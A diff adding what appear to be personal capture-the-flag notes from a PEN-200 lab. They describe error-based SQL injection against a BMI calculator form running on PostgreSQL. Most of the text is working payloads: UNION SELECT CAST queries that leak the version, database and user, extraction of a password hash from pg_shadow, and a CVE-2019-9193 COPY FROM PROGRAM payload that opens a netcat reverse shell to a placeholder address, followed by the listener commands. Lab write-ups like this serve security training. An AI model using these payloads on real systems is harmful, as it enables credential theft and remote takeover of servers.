@@ -1,0 +1,34 @@
+Found BMI calculator Form; Height attribute is enumerate with (')
+
+Identified the vulnerable parameter accept up to 6 
+'ORDER BY 6 -- //
+
+#Find the correct column and from the Pen-200 hint mentions CAST() function to convert data into imcompatible type, thus triggerred an error message with data
+weight=1&height=' UNION SELECT null,CAST(version() AS INT),null,null,null,null--&age=4&gender=Male&email=test%40email.com
+
+#In return of error, I get the ERROR below, where it is running in PostgreSQL 13.7
+pg_query(): Query failed: ERROR:  invalid input syntax for type integer: &quot;PostgreSQL 13.7 (Debian 13.7-0+deb11u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit&quot; in <b>/var/www/html/class.php
+
+#PostgreSQL References
+https://pgpedia.info/
+
+#Find the databases and current user
+weight=1&height=' UNION SELECT null,cast(current_database() AS INT),null,null,null,null --&age=4&gender=Male&email=test%40email.com
+DB Name: glovedb
+
+weight=1&height=' UNION SELECT null,cast(current_user AS INT),null,null,null,null --&age=4&gender=Male&email=test%40email.com
+Current User: rubben
+
+#Get the password
+weight=1&height=' UNION SELECT null,cast(passwd as int),null,null,null,null FROM pg_shadow --&age=4&gender=Male&email=test%40email.com
+md5ae8c67affdb169a42c9631c02fc67ede
+
+#From the hint mentioned can refer to CVE-2019-9193
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#cve-20199193
+';DROP TABLE IF EXISTS cmdexec; CREATE TABLE cmdexec(data text); COPY cmdexec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/sh <ip> 443';--
+
+#Listen to the reverse shell and find the flag
+nc -lvnp 443
+pwd
+cd /var/www
+ca flag.txt
